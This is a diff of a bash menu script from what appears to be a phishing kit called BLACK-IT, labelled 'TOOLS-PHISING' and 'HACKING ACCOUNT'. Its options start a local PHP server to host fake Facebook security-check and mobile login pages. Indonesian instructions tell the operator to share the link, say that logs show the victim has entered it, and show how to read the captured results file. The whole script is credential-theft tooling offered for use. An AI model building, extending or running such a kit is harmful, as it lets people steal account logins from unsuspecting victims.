@@ -21,9 +21,9 @@ echo $i "TOOLS-PHISING"
 echo $pur"____________________________________"
 sleep 1
 echo
-echo $i" when server was started :"
-echo $pur"[" $ku"?" $pur"]" $ku" open new session"
-echo $pur"[" $ku"?" $pur"]" $ku" run Next.sh"
+echo $i" Author : Mr.J :"
+echo $pur"[" $ku"?" $pur"]" $ku" MR.J BLACK-IT"
+echo $pur"[" $ku"?" $pur"]" $ku" HACKING ACCOUNT"
 echo $pur"____________________________________"
 echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
 echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
@@ -63,7 +63,7 @@ echo $pur"now open new session and run Next.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 v2.php
+php -S 127.0.0.1:8080
 fi
 
 if [ $pil = 3 ]
@@ -74,9 +74,10 @@ echo $pur"now open new session and run Next.sh"
 echo $ku"----------------------------------------------------------------------------------"
 echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
 echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
-echo $pur"[+]JIKA INGIN MELIHAT HASIL BUKA SESSION BARU DAN KETIK sh Hasil.sh"
+echo $pur"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
+echo $pur"[+]JIKA INGIN MELIHAT HASIL KETIK CTRL+C DAN KETIK php hasil.txt"
 echo $ku"----------------------------------------------------------------------------------"
-php -S localhost:8080 -t ~/BLACK-IT/v2.php
+php -S 127.0.0.1:8080
 fi
 
 if [ $pil = 4 ]
@@ -101,8 +102,7 @@ fi
 
 if [ $pil = 7 ]
 then
-cd ~/BLACK-IT
-sh Hasil.sh
+php hasil.txt
 fi
 
 if [ $pil = 8 ]
